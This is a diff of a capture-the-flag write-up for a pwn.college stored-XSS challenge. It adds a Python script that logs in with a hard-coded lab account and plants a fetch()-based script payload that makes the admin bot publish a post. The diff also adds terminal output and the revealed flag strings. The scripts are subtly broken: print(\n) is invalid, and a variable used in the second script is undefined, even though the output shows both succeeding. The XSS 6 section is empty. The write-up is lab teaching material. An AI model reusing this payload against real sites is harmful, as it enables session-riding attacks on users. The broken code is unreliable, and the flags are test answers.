@@ -2200,7 +2200,7 @@ pwn.college{o7wdmvRzvfztdZPRvbCm3SV9fBI.dVTOzMDL4ITM0EzW}
 ## XSS 5
 
 ### Source code
-```py title="/challenge/server"
+```py title="/challenge/server" showLineNumbers
 #!/opt/pwn.college/python
 
 import flask
@@ -2318,7 +2318,7 @@ app.config["SERVER_NAME"] = f"challenge.localhost:80"
 app.run("challenge.localhost", 80)
 ```
 
-```py title="/challenge/victim"
+```py title="/challenge/victim" showLineNumbers
 #!/opt/pwn.college/python
 
 import psutil
@@ -2362,4 +2362,155 @@ browser.find_element(By.NAME, "submit").submit()
 
 time.sleep(2)
 print("Visited! Go check if the attack worked!")
+```
+
+
+### Stored XSS
+
+In this challenge, we have to make the `admin` visit the `/publish` endpoint, so that their draft post is published and we can get the flag.
+
+For this we have to follow multiple steps:
+- Login as either the `hacker` or `guest` user
+- Make a draft, which contains our payload
+- Publish the draft payload, so that it can be triggered by the `admin`
+
+For our payload we will have to use the `fetch()` API. 
+It provides a JavaScript interface for making HTTP requests and processing the responses, which is exactly what we need.
+
+#### Exploit
+
+```py title="~/payloadScript.py" showLineNumbers
+import requests
+
+login_url = "http://challenge.localhost:80/login"
+draft_url = "http://challenge.localhost:80/draft"
+publish_url = "http://challenge.localhost:80/publish"
+
+# Login credentials
+login_data = {
+    "username": "hacker",
+    "password": "1337"
+}
+
+# XSS payload
+payload_draft = {
+    "content": '<script>fetch("http://challenge.localhost:80/publish", {method: "GET", credentials: "include"});</script>'
+}
+
+with requests.Session() as session:
+    # Step 1: Log in
+    login_response = session.post(login_url, data = login_data)
+    print("[+] Login response:")
+    print(login_response.text)
+    print(\n)
+
+    # Step 2: Draft malicious payload
+    draft_response = session.post(draft_url, data = payload_draft)
+    print("[+] Draft response:")
+    print(draft_response.text)
+    print(\n)
+
+    # Step 2: Publish malicious post
+    publish_response = session.get(publish_url)
+    print("[+] Publish response:")
+    print(publish_response.text)
+```
+
+```
+hacker@web-security~xss-5:/$ python ~/payloadScript.py
+[+] Login response:
+<html><body>
+Welcome to pwnpost, now with users!<hr>
+
+            <form action=draft method=post>
+              Post:<textarea name=content>Write something!</textarea>
+              <input type=checkbox name=publish>Publish
+              <input type=submit value=Save>
+            </form><br>
+            <a href=publish>Publish your drafts!</a>
+            <hr>
+        <h2>Author: admin</h2>(Draft post, showing first 12 characters):<br>pwn.college{<hr></body></html>
+
+[+] Draft response:
+<html><body>
+Welcome to pwnpost, now with users!<hr>
+
+            <form action=draft method=post>
+              Post:<textarea name=content>Write something!</textarea>
+              <input type=checkbox name=publish>Publish
+              <input type=submit value=Save>
+            </form><br>
+            <a href=publish>Publish your drafts!</a>
+            <hr>
+        <h2>Author: admin</h2>(Draft post, showing first 12 characters):<br>pwn.college{<hr><h2>Author: hacker</h2>(Draft post, showing first 12 characters):<br><script>fetc<hr></body></html>
+
+[+] Publish response:
+<html><body>
+Welcome to pwnpost, now with users!<hr>
+
+            <form action=draft method=post>
+              Post:<textarea name=content>Write something!</textarea>
+              <input type=checkbox name=publish>Publish
+              <input type=submit value=Save>
+            </form><br>
+            <a href=publish>Publish your drafts!</a>
+            <hr>
+        <h2>Author: admin</h2>(Draft post, showing first 12 characters):<br>pwn.college{<hr><h2>Author: hacker</h2><script>fetch("http://challenge.localhost:80/publish", {method: "GET", credentials: "include"});</script><hr>
+</body></html>
+````
+
+Great, we can see that out payload was first put into the drafts, and then published.
+Let's cause the `admin` to trigger the payload.
+
+```
+hacker@web-security~xss-5:/$ /challenge/victim 
+Problem reading geckodriver versions: error sending request for url (https://raw.githubusercontent.com/SeleniumHQ/selenium/trunk/common/geckodriver/geckodriver-support.json). Using latest geckodriver version
+Exception managing firefox: error sending request for url (https://github.com/mozilla/geckodriver/releases/latest)
+Error sending stats to Plausible: error sending request for url (https://plausible.io/api/event)
+Visiting http://challenge.localhost:80/
+Visited! Go check if the attack worked!
+```
+
+Since the `admin` triggered teh payload successfully, their post containing the flag must be published.
+
+```py title="~/script.py" showLineNumbers
+import requests
+
+publish_url = "http://challenge.localhost:80/"
+data = {
+    "username": "hacker",
+    "password": "1337"
+}
+
+with requests.Session() as session:
+    response = session.post(url, data = data)
+    print(response.text)
+```
+
+```
+hacker@web-security~xss-5:/$ python ~/script.py
+<html><body>
+Welcome to pwnpost, now with users!<hr>
+
+            <form action=draft method=post>
+              Post:<textarea name=content>Write something!</textarea>
+              <input type=checkbox name=publish>Publish
+              <input type=submit value=Save>
+            </form><br>
+            <a href=publish>Publish your drafts!</a>
+            <hr>
+        <h2>Author: admin</h2>pwn.college{c5gbzp4Rtz-r5_BHifsc6nyVbyB.dZTOzMDL4ITM0EzW}<hr>
+<h2>Author: hacker</h2><script>fetch("http://challenge.localhost:80/publish", {method: "GET", credentials: "include"});</script><hr>
+```
+
+&nbsp;
+
+## XSS 6
+
+```py title="challenge/server" showLineNumbers
+
+```
+
+```py title="/challenge/victim" showLineNumbers
+
 ```
